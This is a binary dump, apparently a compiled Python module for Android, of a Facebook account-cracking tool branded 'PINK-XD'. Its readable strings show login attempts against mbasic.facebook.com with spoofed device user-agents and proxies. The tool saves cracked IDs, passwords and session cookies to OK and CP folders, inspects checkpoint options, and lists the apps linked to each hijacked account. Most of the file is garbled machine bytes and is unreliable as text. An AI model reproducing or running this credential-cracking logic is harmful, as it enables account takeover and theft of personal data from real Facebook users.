+ �d@|�dT|��}t-|dAd4�}t.t-|dUd6��td7aWnnWqKWqKtj4j5�yWt6�7dV�YqKwtd7adS)WNr�%r��	socks5://�0 %s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬r/r�rRr0r1zEhttps://mbasic.facebook.com/login/save-device/?refsrc=deprecated&_rdrr2r�r3r�r�r�rr�r�r�r�mbasic.facebook.com�https://mbasic.facebook.comrr�r�r�r�r�r��=https://mbasic.facebook.com/login/device-based/password/?uid=z6&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdrr�r�rrr|FrrcSrrrLrrLrLrMr�rzcracktouch.<locals>.<listcomp>r rr�r�r<�[•] ID : � [•] PASSWORD : r�rv� 
+ PINK-XD CP��title�/sdcard/sdcard/CP/rJrr���SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]r�cSrrrLrrLrLrMr�r�/sdcard/sdcard/OK/� 
+ [•] PASSWORD : � 
+ [•] COOKIES  : ruz 
+ PINK-XD OKcSrrrLrrLrLrMr�rrrM�>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive�r~r��<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active�: 
+ [bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan]  
+ �`</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>�[bold cyan][r�rr� [/bold cyan] 
+ �> 
+ [bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow] 
+ �[bold yellow][�[/bold yellow] 
+ �[bold green][•] ID       : �[/bold green] 
+ �#[bold green]PINK-XD OK[/bold green]r)8r�r�rqr��kkr�r��hhrr�r�rr@rrBr�rnrorHr�r�r�rGr�rpr�r�rCrEr�rDr�rr+rr~rrr �oprekr!rA�ceker�princprryrxr=r��	taplikasir�rFr�r�rirj� r�r��biZpersZfffr&r'rIr$r�r%r(r)r*r,ZstatuscpZ	statuscp1Zheadappr-r.ZstatusokZ	statusok1�userZinfoakunr#Zcek2�cekZapkaktifZnokZmunculZhitZapkexprLrLrMr��s� 
+  
+  
+ 6 
+ :4 
+   
+  
+  
+ ( 
+ 
+ ($(� �!�r�c Cs�t�ttttttg�}tdt	t 
+ �}d}t�t�}dd|i}t�t�}t�t �}t��}        tj�d|tt        t 
+ �ttt|�t|�tf�tj��|D�]�} 
+ �z�|        j�tdddd        |d 
+ ddd dd� 
+ �|        �d|d�}t�dt|j��� d�t�dt|j��� d�|dd| 
+ d�}d�!dd�|j"�#��$�D��} | d7} |	j%d|d| it&d|d�}d |j"�#��'�v�r	d!t(vr�t)�*|d"| 
+ �t+|| 
+ �n?d!t,v�rt-d#�d$|�d%| 
+ ��}t.|d&d'�}t/t.|d(d)��t0d*t1d+��|d"| 
+ d#�t)�*|d"| 
+ �td7anWqKW�n9d,|	j"�#��'�v�r-d-d.i}d/t2v�rh|j"�#�}d�!d0d�|	j"�#��$�D��}t0d1t3d+��|d"| 
+ d"|d#�t-d#�d$|�d2| 
+ �d3|��}t.|d4d'�}t/t.|d5d)��td7aWn�d!t2v�r,|j"�#�}d�!d6d�|	j"�#��$�D��}t0d7t3d+��|d"| 
+ d"|d#�|}d8}t��}|jd9||d:�j}|jd;||d:�j}|d<7}t�4d=t|��}d}|D]}|d>|�d?|d@�dA|d�dB�7}|d7}�q�d@}|dC7}t�4d=t|��}d@}|D]}|d7}|dD|�d?|d@�dA|d�dE�7}�q�t-d#�dF|�d2| 
+ �d3|�dG|��}t.|d4d'�}t/t.|dHd)��td7aWnnWqKWqKtj5j6�yAt7�8dI�YqKwtd7adS)JNrr5r�r6r7z .facebook.comr��?1rRz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r�r�r�r�) 
+ r�r�zsec-ch-ua-mobiler�r�r�r�r�r�r�r:r�r�rr�z.https://mbasic.facebook.com/login/save-device/r�rrcSrrrLrrLrLrMrrzcrackmbasic.<locals>.<listcomp>r zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0r|Frrr�r�r<r;r<r�rvr=r>r@rJrr�rAr�cSrrrLrrLrLrMrrrBrCrDrur�cSrrrLrrLrLrMr"rrrMrErFrGrHrIrJr�rrrKrLrMrNrOrPrQr)9r�r�rqr�rRr�r�rSrr�r�rr@rrBr�rnrorHr�r�r�rGr�rpr�r�ZdorCrEr�rDr�rr~rrrr+r rTr!rArUrVrryrxr=r�rWr�rFr�r�rirjrXrLrLrMr��s� 
+  
+  
+ 6 
+ &: 
+   
+  
+  
+ ( 
+  
+ ($(���r�cCs�d}ddddd|ddd	d 
+ ddd ddd�}t��}z�|�d�}t|jd||dd�|dd�jd�}|�d�}i}gd�}        |d�D]} 
+ | 
+ �d�|        vrT|�| 
+ �d�| 
+ �d�i�q>t|jdt|d�||d�jd�}t        dt 
+ ||tf�tdt d ��|d!|d"�td#7a|�d$�}t|�d%kr�t	d&ttf�WdS|D]} t	d't| jtf�q�WdSty�}z-t	dt 
+ ||tf�t	d(ttf�tdt d ��|d!|d"�td#7aWYd}~dSd}~ww))Nz�Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]r8r�rRr9r�|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9r�r��navigater\r��:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8r2r�r�%https://mbasic.facebook.com/login.phpr��ZemailrrkT�r�r�r�html.parser�form�ZnhrZfb_dtsgzsubmit[Continue]Zcheckpoint_datar�rr 
+ �action�r�r�� %s++++ %s|%s ----> CP %sr4rJr�r<r�optionr�2 %s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)� %s---> %s%sz> %s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s)rBr�rC�soprrD�findr�rGrr�r�r=r�rHr��find_allr�rSrRr�rq)r�r%rI�headr��hi�ho�jor��lion�anj�kent�opsi�opsii�crLrLrMrUCs<$ 
+ " 
+ �$  
+ � ��rUcCs�tt�}d|}tt|dd��ttdtdtd�d}t��t	|dd	��d 
+ }tD�]E}�z/z|� 
+ d�d 
+ |� 
+ d�d}}Wn tydt� d �tdt|tf�tdttf�YWq.wt�ttttttg�}td||tt�|tfdd�tj��d}t��}	ddddd|dddddddd d!d"�} 
+ |        �d�}t|        jd#||d$d%�| 
+ d&d'�jd(�}d)|	j��� �v�r=zi|�!d*�} i}gd+�}| d,�D]}|�d-�|vr�|�"|�d-�|�d.�i�q�t|	jdt#| d/�|| 
+ d0�jd(�}td1t||tf�|�$d2�}t|�d 
+ k�rtd3ttf�n|D] }td4t|jtf��qWn6td1t||tf�td5ttf�Ynd6|	j��� �v�rRtd7t||tf�n 
+ td8t||tf�|d7}Wq.tj%j&�yttd9�t'�Yq.wtd:�t'�dS);NzWTerdapat %s Akun Untuk Dicek 
+‌ Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih DahuluzCEK OPSIr>rOrPz] Mulaiz# PROSES CEK OPSI DIMULAIrurvrr�rr�z %s++++ %s ----> Error %sz2 %s---> Pemisah Tidak Didukung Untuk Program Ini%sz %s---> %s/%s ---> { %s }%sr)�endz{Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36r8r�rRr9rr]r�r�r^r\r�r_r2r�rr`r�raTrbrcrrdrer�rr 
+ rfrgrhrirjrkz# %s---> Tidak Dapat Mengecek Opsi%srz %s++++ %s|%s ----> OK %sz" %s++++ %s|%s ----> SALAH %szINTERNET CONNECTION ERRORZDONE)(r�r!rxryr�rqr�rwrr�r�� 
+ IndexErrorrirjr�r�r�r�r�rRrSrnrorprBr�rCrlrrDr~rr rmr�rGrnr�r�r�)rxr�r[rlZkesr�r%rYrIr�Zheaderrprqrrr�rsrtrurvrwrLrLrM�cek_opsiasl
+" 
+ �($ 
+ " 
+ �$ 
+ � 
+ � 
+ r{c	CsF|jdd|id�j}t|d�}|jddd�}dd	�|�d 
+ �D�}t|�dkr5tdt�d t�dt�d��nt        t|��D]}tdt 
+ |d||�dd�tf�q;|jdd|id�j}t|d�}|jddd�}dd        �|�d 
+ �D�}t|�dkr�tdt�d t�dt�d��dSt	t|��D]}tdt|d||�dd�tf�q�dS)NrGr|r}rcrdr)r�cS�g|]}|j�qSrL�rD�r�irLrLrMr��zcek_apk.<locals>.<listcomp>Zh3rz 
+ rO�!z1] opshh there are no active apps on this account.z %s%s. %s%srzAdded toz	 Added torEcSr|rLr}r~rLrLrMr�r�z8] opshh there is no expired application in this account.ZExpiredz Expired) rCrDrrmrnr�rr)r(r�r#�replacer&)r#r|r rlr�ZgamerrLrLrMr"�s" 
+ & 
+ &�r"cCst�d�t�d�t�dS)Nz%xdg-open https://wa.me/+8801715650048r�)r`rarirj�noobbossrLrLrLrM�fuck_your_system�s 
+  
+  
+ r�cCs$t�t�d�t�d�t�dS)Nr_r�)Zlogor`rarirjr�rLrLrLrM�yt�s 
+  
+  
+ r��__main__zgit pullztouch .prox.txt)�rBZbs4r�r`rnr�ZdatetimerirEreZurllib3Zrich�base64Z 
+ rich.tabler�meZrich.consolerrwrrlZconcurrent.futuresrr�rZgpZ 
+ rich.panelrryrrxZ rich.markdownr	r�Zrich.columnsr 
+ r�ZrprintrZ	rich.textrZtekzZinstallZCONrarr@Zcokbrutr�r�rVrCrDrr=rHr�rrr>r?r�ZxdrJZ	randranger�rx�d�f�gr�r�jr�rNrArKr��lZuaku2r�Zuakr�r�rr�r�r!rTr�Z	lisensikurWr�r�Zlisensikunir�r�rdr$rr(r0r&r)r+r#r,r*rZwarr�r-r5Zsirr�rSrqrRr(r�ZdicZdic2ZnowZdayZtglrGZmonthZblnZyearZthnr�r�rmrsr[rtrcrkr�r�r�r�r�r�r�r�r�r�r�r�rUr{r"r�r��__name__rLrLrLrM�<module>s,P 
+  
+  
+ ��< 
+ B>8  
+ ((S*/-=8+)UR7 
+          
+ �__test__;p �0�8�@�T�t��4�\|#��#�t$�D%�zR|�4�Ltdd|` �h�`$�T(T@�������,�T� ``����� 
+ ��������!�L ����<H"xL ����\�"�P0���� 
+ �,|P#p\P����� 
+ �����_$� �`R�_$��_�_$����_$�`�����_�_$� �(�� ՂP�����_$� ��O� ՠ���{�������W��O�����@���(�	�D�?�@T?�`T����!�6�mC�@�������`T(��D���h@��h�k������!L1����������@�����aT������������������!�9���w� �������!�3��������@��*���aT��q��7������!�9�d�  
+ �������!�1�����m��@��*���aT��^���7������!�/�Q� 	�������!�3�����Z��@��*���aT��K�W 
+ �7������!�1�>� ����qC��T������!�3���C��*�@���TU�6<�*�@���A��T��-���7���@��OC��WB��{Ĩ�_��uC�@�.� 40�������!�9�� ����uC�@�#��4%�������!�/�	� ����uC�@��`4�������!�1��� ����uC�@� �4����@��OC��WB��{Ĩ�_�h@��h�aT���������@��OC��WB��{Ĩ�_��C��{�����o��g��_��W��O�[�;�<�h@�������D�h��T����!X2�yC�@����2��������B�1��C���Rc�RD�R���C@97��4�@9?k�T�G@9h4�@9?k!T�K@94� 
+ @9?k�T�O@9�4�@9?k�TW�*��(�RH�Rh�R�jh8�Q)qB	T�39���@9�qaT��R�#9�@9_�q@T)�RK�Q)1�T-	�Q?)1CT�#9�@9_�qT��R�'9� 
+ @9_�q T)�R�*K�Q)1cT�'9� 
+ @9_�q!T�q�T��R�+9�@9�qTH�Q)1�T�+9�@9�q�T�5��R	�Q?)1CT�/9���Ф���B<5��l6��c��C��#��R{��c���"�R{���7��|�(���)��������8�y�(���(��������8�v�(�	�@(�4�����'���h@��h�G���@'�@��������8�g�(��`&�@�������5�^����%�@� �A��p���@��@�X���7�s��h"@9i&@9(*h4h*@9H4`_�Q�h�^��h�^�@���S`"��8�h�^��h�^�@���Jh��`_��"���@�h�^��h�^�@��>)�h�^��h�^�@��7���Th 
+ @�s��H����}C�@��4��C��@�/� �71�@"�������!l6�0���������D�!l6����� !�7� �Rs�)�a@�(�`�`	����#E�&� �����D�������#��������������*���>���Ru��Ru��RZ�R��D���� E�B���E����#��NF����~��.@��.������@��	@�EE�?�T�IE�����C��� T��C����T����@5��`>�С���!�1�mC�@�������R���U��R���������h@��h�aT�������@���aT��{��	�����b(��@��@��� 	�7�@���aT��m��@��@� @�?�AT�)E���@�����@�	���I@�!-E�(�?��� ��@���aT��S����1E����@������aT��G���=����@������Th@��h��T������@��*@�������7�@����a1T���U��Rl�����RZ�R�@������T��"�h@��h����T���o�@����ĀRY��ŀRZ�R�@������a��T���P�����RM����RK��5��RI�����RG�����RE��5��RC��	�)�(� @�!)@�@�I@��?������Z��	�q�C�)�C��@�6��H�����T����E�����Z�)�A@�"@�S�@����@� @�H��@����$ս�R����R��#E�{�	G��� ����€Rz�R���#E�R��� ����€Rz�R	��5ÀRz�R�@������A��T����ÀRz�R���/���@��������(�@�)@�B�C����*��E�����6@��6���@���AT�����@����aT�������@����aT�����q�S�Z	�S4ME��)�I�+q�T 
+ Q+�J        @�_k�T�ZF��~��.@��.�� 
+ 4�������������9�!�1�B�8��*�� ������������`1��*��(@����(�	T��m�Ek4�*�*� k Tj K_qJ����� 
+ *�*��        @��k���T 
+ TM�*���	@��*�kJ��_	kJ��T	�*�)	@�?k���TI}@�)�|�ii��@����������� E����������f������@���aT��7�V��@�����T��0����������`1�!�1��*����� ����6@���E�����6���@���AT���H@��H�aT�����(@��(�aT����@����4��ME�`��I�	q$T 
+ P)��*J        @�_k�Ti4�*��        *�*�k�T*K_qJ��v��* 
+ �6�J        @�_k���TK��T 
+ @��*_k֦��k�T	�6�)	@�?k�T	�)�I�	kAT�~|�h�`���	�)�'�(@� Y�7	�k�T 
+ }@��~@��(�`�<lA�J�_	�`�=��L��T�~@�		�3	�5��	�w��(@��(�aT������@���aT�������@����aT���������D������@���AT����D����Zh@��_�	�aT�OT��WS��_R��gQ��oP��{O��C��_���R$����	�R�'�*�R�@�Y�		� 
+ ���=���~@�	�|�hi�h)�	@�)�	�aT��~��@�4����{���O��������E�	@���)I@�	� ?�������OA��{¨�_�����@���С���!�9����C�@������OA��{¨�_��{���O�������b(���b@��@����@� @�����@����OA��{¨�_֮������OA��{¨������OA��{¨�_��{�������O�@�����A@�5������0����5�������?����������@��OB��{è�_������OB����@��{è����������@��OB��{è�_�С���!8��C�@�������@��OB��{è�_�����{��C��g��_��W��O�X�;���@�����'�@�i@�)�i�@�����@����$T�9�T�@���yy����� ��5�@�@�D��B9� 6@�I@�h���?�����������D� ��6��H��������@����T�@����aT�����@����T��h@������h���!	T�������qC�� Th@���	�B9�(7	С���!�8�� E�����:E�"@����:E�Q�������	���7	Ј@�)�C�	��T���� �E���	U@���7��7	С���!�/�)�C� @� @�"��*@�	@���TС���!4��C�@�s� �R����.�����`���h@��h��T@��@�	��T���OE��WD��_C��gB��{A�����_���d�@��@�	�`��T����]�������@��@�	�@��T���������� 
+ �4����! �R�������������������������! �R���������������@����!��T��4������@��@�	� ��T����{����C�� � � � ���C�"� ���C�B� ���C�b� ���C��� ���C��� ���C��� ���C��� ���C�� ���C�"� ���C�B� ���C�b� ���C��� ���C��� ���C��� ���C��� ���C�� ���C�"� ���C�B� ���C�b� ���C��� ���C��� ���C��� ���C��� ��D� � ��D�" � �� 
+ D�B � ��D�b � ��D�� � ��D�� � ��D�� � ��D�� � ��"D�!� ��&D�"!� ��*D�B!� ��.D�b!� ��2D��!� ��6D��!� ��:D��!� ��>D��!� ��BD�"� ��FD�""� ��JD�B"� ��ND�b"� ��RD��"� ��VD��"� ��ZD��"� ��^D��"� ��bD�#� ��fD�"#� ��jD�B#� ��nD�b#� ��rD��#� ��vD��#� ��zD��#� ��~D��#� ���D�$� ���D�"$� ���D�B$� � 		.�	 �����ox	���oxp0�8  
+ ����o� 
+ � 
+ (����o�	���o� 
+ ���o����������������������������������������������������������������������������������������������������������������������������clang version 14.0.5Android (8481493, based on r416183c2) clang version 12.0.9 (https://android.googlesource.com/toolchain/llvm-project c935d99d7cf2016289302412d708641d52d2f7ee)Linker: LLD 14.0.5$P$�d�4�P�L�d��P�(Q(4�Q�$�0��4cL�c8\PdpP��P��e��e��P��eeL�e� dLxd� eLxe� �Lx���Q�� gLx���P� fLXP f$ldd�d$led�e$l�d��04QptQ4X�Xlgt��4<P<lft�PXlfp�d��dp�e��ep�����|�Q��Q�����g�����P��f��P��f��d��d��ee��e�4�����Q��Q����e�4e����P�4d��P�d4d4dPdLcL��P���c�� 
+ �P�� 
+ � 
+ cx��P�h���@ 
+ �@ 
+ T 
+ eT 
+ � 
+ �� 
+ � 
+ �x��h�0��L 
+ 0�T 
+ � 
+ 0�� 
+ � 
+ 0�x�0���0�h���@ 
+ �@ 
+ T 
+ jT 
+ � 
+ �� 
+ � 
+ �x��h�0��|	0�|	�	f�	�	0��	�	P�	�	c�	�	0��	 
+ P 
+ 0 
+ f0 
+ @ 
+ 0�T 
+ t 
+ ct 
+ x 
+ 0�x 
+ � 
+ P� 
+ � 
+ f� 
+ � 
+ 0�x�0���f��0���f��Ph�0���0��0	d0	\	0��	�	0��	�	P�	�	d�	0 
+ 0�8 
+ \ 
+ d\ 
+ � 
+ 0�� 
+ � 
+ 0�x�0���0���d��P��d��@��dld�����������$�$,�,4�48�Pd�d����������������������4���\�\t�t�Y�������(YP��h���h#(�0<P<`c��0���e��0���P��f��0���d��0���P��c��������0���0���d��c��c��0�� 
+ x0��� 0�� e(D0�D�e��0���e��0�� 
+ x0��� 0�� f(00���0��d� 
+ xd��d�d�
+xd�0d��d$,P,Pg� 
+ � 
+ P@xgL�f(@f`xf`	x	X��Xp	x	Q��Q�	�	f�	�	dT 
+ l 
+ d�	�	c\ 
+ | 
+ c$�$�e� e4 � e(De��e� 
+ � 
+ P��P� 
+ � 
+ Q��Q� 
+ � 
+ X@g�g(@g$�h$�i$�c(LP(�g0�f��c4 � c���4 @ �@ L Z\ � Z� � ����4 @ �@ � ]� � ���c4 � c��X4 � X��Y4 � Y��[4 @ [@ H ^H � [� P Q��P��0���P�4 i(D0���i� 0� 4 e(D0���0�� e(De��e 4 i� � ZH�h�0hHlg0g��gH�f,0f��fP�iTtPT�j��c��c��e��e��P��P��P����f0f08�����0[08���Y�\@Y@Xf��fl�g��X��Z��X48P�P8c8@�P�@pcpx�P�(X@DX Y,8dHpdx�P��c���P���c���P���c���P���P���0����0����0��P8c8T�P�T`c`x�P����P��QLdLT�Q�T`d`p�Q�p�d���Q���d���Q���0�HeThep�e��e8Lcpxc��c��P�d�P�h�d��d0d��chtcP�ehtex��ihti<�f��fPtf��fPlP��P\`Xp�g��g��g��ehte��ehte��cptc��c��ecLdc�0c0���0���d��0��d0�d��g��0��g@0�@�e�e�e@c@�e�e�ed��d��dc�cd��d��f��f�ffLdfcLdc%4I?:;$>4I:;:; I:;8I:;I	:; 
+ I:;8 I:;8:; &I'II'I:;I:;( :;<I'I!I7$>..@�B:;'I:;I4:;I 
+ :; 1XYW!41"41#$1%1UXYW&1'1XYW( 
+ 1)U*41+1UXYW,��1-��1.���B/���B04I:;1:;2 I:;83!I74:;5 I:; 86.@�B:;'I?7��1�B8.:;'I<?9.:;'I :4:;I;.:;' <:;I=.:;'I<?>.:;'<??.:;'I<?@.:;'<?AB 
+ :;CD���BE��1�BF.:;'I G:;I?: �.��0	@�	����]�	�h 
+ Kb        � 
+ L�$ 
+ M(�$ 
+ N0xB 
+ O8vu 
+ P@9� 
+ QHDA 
+  
+ RP�g 
+ SX� 
+ T`�g  
+ 1g ( 
+ , 
+ -2k 
+ .qB 
+ /�L 
+ 0 !�m�	i6Bk�ulMi	kXI�cIBn��z�dB	X����J$�- B� �B�(�5�0@B�84Q�@�v�HK��P�M�X�X�`R��hd��p��xf 
+ B׀n 
+ M؈�	ِj	ژd*	ݠ�: 
+ ��$�4A 
+ �g���� 
+ ��I B��a� 
+ ���� 
+ ��e� 
+ ��y 
+ ����� 
+ L�� 
+ L� 
+ �� 
+ ��� 
+ �B� *�(�	�0p�8?@mgHvLP!LX�L`�Lh�L	pQ5 
+ x� 
+ % �5��	,��vst�Bu) .�@�EL\t	�aLLq.����@LqL���� �R��$��[��A������LL� LLH,�@{-? 
+ L��	�]h8� h."m5"n�"o�"p:"q �Br(D�s0��t8U�u@WgvHZ�wPI"xXS"y`K"zha"{p_"|x�}�Q�~��	��h"��	"��"��'"���B��]"��I"��["��"��"��P"��: "��d"�� 
+ "� 
+ ��� 
+ �"� 
+ 1"�-�2LLLM��RLLLLrA�w@L��R�P�\ 
+ �<"�o+��+�-�� FK�(H��0wp�8"�@Y+�H� BL6 �;LLBV`�[@LBL{|��@LL��k���]"��������@LLL�|��		LB�t-�����/	:	����W	�# 
+ �b	�@g	@L|	@�	�	w>�P1j�2�L3wB4pB5{@7 :@8$�q9( 
+ :0� 
+ ;8y 
+ <@n�=HB) 
+ �A. 
+ L|        u 
+ L 
+ @�Q 
+ @Lf 
+ �q 
+  �v 
+ @L�� 
+ #�� 
+ LLL@�[ ��� 
+ �� 
+ � #�$$� 
+ %�@&$(-�	��(� 
+ $�^ i~M$� i�nLL��q	�@LL��M������������LuB�T��LuLL��(75C<LLV`L[ L: 
+ �	.pLz� 
+ �*�# 
+ =�@ 
+ >�� 
+ ?���	��z�y���	�����# 
+ @� Z	��$ \Cn�+x L���#Լ� m��@}��#`�L��#hrJ	�L	��@�	��$$ 
+ d�@� 
+ ��LE�Lq.p��9�� �+8���!��+"� �+"� �+"� �+"��+#� !��+!��+ p"h��$cy" p"���$Py" p"���$Py"%p"��$Py" ,��� ,���&',#��4c��L'6,��%L,� 
+ & Y,&�e,&�q,"�},"��,"�,"Q�,"0�,(�,d� �"d��'�"d�7	 �"|��'�"��7	%�,03&�,"f�,"-"�-"�-"+-"_7-(C-��%L-�n&�Y-&�e-"?q-"�}-"[�-"~�-"��-%�-��$d�-)"�-%�-0�!&s.&�."�.%�"`�	&8�" (.��`�$d1.$h=.$iI.$cU."�a."�m." 
+ y. �"���$P# �"��7	$P�" �"���$g# �"��7	$g�" �"��$f# �"�7	$f�"%�.�p&-�."��.*�.%�.��&p�.&��.&:�."c�."��."�/ �-\�r	$d�-%/�s&8/&Q'/"�K/"�W/(c/|�%�"0^$i#%�"`7	&��" �"|�a$i# �"|�7	$i�" (.��`}	$d1.$h=.$gI.$fU."�y."�a."�m. �"���$P# �"�7	$P�" �"��$j# �"�7	$j�" �"0��$i# �"4�7	$i�"%l/�~	&u/&G�/"}�/"��/"�/ �.h�x	$P�.$X�.$c�."��."&�."s/ �"t� 	$X�")�"��/ �"��x $h# �"��7	$h�" �"��y $g# �"��7	$g�" �"��z $f# �"���$e# �"��7	$e�" �"���$f##��^ 5L'�"��5 �"�� $d�" p"��$dy"%�-�&."�.'�" �%�"@&P�"%�"p&s�"%�"�&��" �"��)$f�" �"��/$d# �"��7	$d�"%�"�0+�"7	,+0�,�/<�-�/\�.T:.S3.Q5.P�-�/��.Q�.U�.S�.P�-�/�.R1.Q�,0�,"00�,80L�-A+x�.P�,N0��,N0��,_0�,{0�,"04�,�0d�,80��,�0��,�0��,�0��,�0��-R+��.P�-�0�.P1,1,�,A+<�, 1H�-+1h�.S�.R�.Q�.P�-P1�.P�,b1$�,+@�-m1��.R�/X�-�1H�.P�-Y2p�.P�, 1��-m1��.R�, 1�/X��-P1��.P�,60�,�68�,�6T�,�6��,~+��,�0��-M7��.S�,`7��-r7��.R�-�7x�.Q�.P�-�7��.P�-r7��.R�,�7�-�74�.P��� D: 
+ /,0�	��$�� L���#�L���# AL���#(GL���#0L���#8�L���#@wQ�	��]� 
+ i��1(�2�H�2�$�2���2�$�2)� 2�)�!2�)�" BrL���#��	��	�)� 4L���#�9�	�)�OL�	���q�	�)���	�)����	�)�	O��	�)�� 
+ ��	�L���#��	(�	�)3�.���	�0�$�0d@�0�@��L���#H�L���#P!L���#X�L���#p�L���#x�L���#�}���#��L���#�qg_&�����#���#��4gZ2�@[2�@\2� �]���Y1V2��W2�@X��� 	���@:@�@� 
+ @� 
+ @ �@$�@(�L0ML8�L@�LH�LP�L X� 
+ &`�L'h>L(p 
+ L)x��+��L,���0�� <�� =�W@>�� ?� � * ��0� 
+ $�@ K _0 
+ �B�}�� %H(� � :�� � �0U�QB�/		��	� � �5�%�5U%�5}%�5�%�5�%�ZB!�(G!%X	J�\!g!�(��HFB �! �!�!l ���! 
+ L��!�!�(��		�" .�6��o�SL7@"��8� 
+ (LQ"]9� 
+ X@:�[ ;� �<��L;`�<��L9%o@<oL<�oL<3o$<�o$<�o@:Pq@:�pL;�4<�4L��(m�~L~LuF	~-:��L.�L��LW���%V"�	"�c" p"��$cy"%�"0�&d�"%�"`�	&��"&�"&��"&O�""��""��"%�"�v	&B�"%�"��	&e�"&��"&�"&��""A�""��"%�"v	&��"%�"0�	&��"&0�"&��"&f�""��""#�"%�"`v	&l�"%�"��	&��"&��"&H�"&�""~�""��" �"��8v	&<�" �"���'�"��7	,1'ȹ,�*й,+�-+<�.P�,0+H�-A+p�.P�-+��.P�-R+��.R�.P�-+Ժ.P�-R+�.R�.P�-+ �.P�-R+<�.R�.P�-+l�.P�-R+��.R�.P�,m+��,~+�-+�.P�,m+(�,~+0�-+@�.P�,m+T�,~+\�-+l�.P�,m+��,~+��==F<'A'L'�	<� �(??�(@k�(A`�(D�@E s@F$�@G(�@L,�H*P0�~*R8�~*S@LTH�LUP�LXX�LY`�LZh��*_p��*c�� Le��@g�Li��: 
+ j��@l��Lm�z�����		@���L��� L��BL��X}�� 
+ )        }� 
+  
+ M*�L'�(�(��))4	�h���)�� L (�L!0�L"8�
+H#@�L$HK@%P�.&T�.'U_L*XD@,`�@-d�@.hO�)/l�*0p 
+ ��!1`)*f�*�*� �@�@�@M*X*W+��@)�y**X*�*e �*@L�(@L�*�8r -�L4�L4LL4� �*6�*�*8. �(>,	 L$?�LL$8^ 
+ LL8� 
+ LL8�:@L$L8Z#@L@�9d� 
+ @:<        � 
+ �+:*� 
+ @:� 
+ $:� 
+ @:�� 
+ @A:� 
+ �+:�� 
+ �+.�.��9�� 
+ @<J� 
+ ,]9�@Bq�9r�@Bq�9�eL<� 
+ eL<�eL<e@:iL:�hL:�gL:�fL:�jLBW�;g<�g$< g@<�h@<�h$:�i�:j�(:Lk<': 
+ lL:�lL:�lLBW�9��@<L�<'< �@:��H:��L: 
+ �L:��L:��LA:� �L;��<L�<'<[�H<��H<��H9 
+ XL<�XL<�XL:�Yu;��<L�<'<[�L<��L<��L:`�L:� �L:0 
+ �L9.��<��@:��@:���9��@<� ��<��@<��@:�@:��@:��@9-�<�.$< .@<�/@<�/$:i1L:�0�BW`;��<��@<���:� ��:��@:�@A:&�A:� @=�6$?E6@q`$C8�@L$B8�LB8�"L$B8-�L$B8+L$?�@L$L?�L$?�jL$B$$?�		L?�@LLL="L89LL$8S#LBC8�LB=�L8�<LLLLL@?q@L=L8~@LLL���m7L�!�L "^	L�"1L#��Bg#P�L,�7��De��.Q�.P�, 8��E8�.Q�.P�,b1�,+H�`�pm5(L�#9(L�&�*L�)P)L%/8�*"5$<8"k$H8"�$T8(`8l� p"���$cy")�"�$i8)�"�%v8%�8�&k%�8&5%�8 �-���$P.$f."�%. �"T��$g�" �"@��$e�"%�"P�& &#%�"�7	&C&�"%�"��&y&# �"��7	&�&�"%?9�-&I)L9&)X9%�8�&�(�8&n(�8&(�8".'�8"�'�8")�8+e9@�	)p!�	9 �"�� 	$g# �"��7	$g�"%�"�.&�)�",�9��-�9��.Q�.P�DX�.Q�-m1$�.R�.Q�.P�-�64�.Q�,�9�-m1�.Q�.P�,�7\�,+��-�9��.P�-�9<�.P�-�9X�.S�.R�.Q�.P�.T�-:t�.R�.Q�.P�-�9��.S�.R�.Q�.P��xmu\L� � 
+ \LF!�\=:<J 
+ \H#!PaL p"P�g$Py",b1l�E�6��.P�?SLLL���m�3L�� 
+ 3LO P4L%�-@4&�.", ./Y��,�6��-�7�.R�?L$C?�$L8��$$@8-F�(<'�LL8d 	@�(8*!6��`8!!4�`8u�LL$C8�"C@$@"D8�#�LLLL9��L:��L:��L:�BBW�A:� 
+ �LA:��L9`�L</�L<��L9��L</�L<��L<��L:9�q:��L:P�LBW"A:�9"9�$$n@$7 
+ @$9��L</�L<��LF>�@G+��!G[��9�9 z? 'LL8�"@LL=."L?��LL8�%@�998�&,L$@LL�98�' 
+ LLLL2:] 
+ U}$dhl������� Ld $ld�PTXlp��������4��$(08��������� 
+ x�0���� 
+ x�� � 
+ @�� 
+ �� $(@��4 � ��4 � �4 (D�� 4 4 ����h���\	`	d	l	p	|	���	�	�	�	�	�	�	�	T 
+ \ 
+ �	�	\ 
+ t 
+ � 
+ � 
+ ��� 
+ � 
